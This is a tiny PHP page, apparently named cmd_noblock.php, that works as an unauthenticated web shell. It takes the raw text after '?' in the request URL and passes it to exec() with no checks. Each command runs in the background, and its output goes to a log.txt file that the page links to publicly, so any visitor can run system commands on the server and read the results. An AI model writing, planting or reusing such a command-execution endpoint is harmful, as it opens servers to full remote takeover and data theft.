<?php
  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "?", 1)+1);
  exec($cmd." >log.txt 2>&1 &");
?>
<form action="/cmd_noblock.php">
  <input type="text" placeholder="command">
  <button type="submit">submit</button>
</form>
<br>
<a href="/">cmd block</a>
<a href="/log.txt">log file</a>
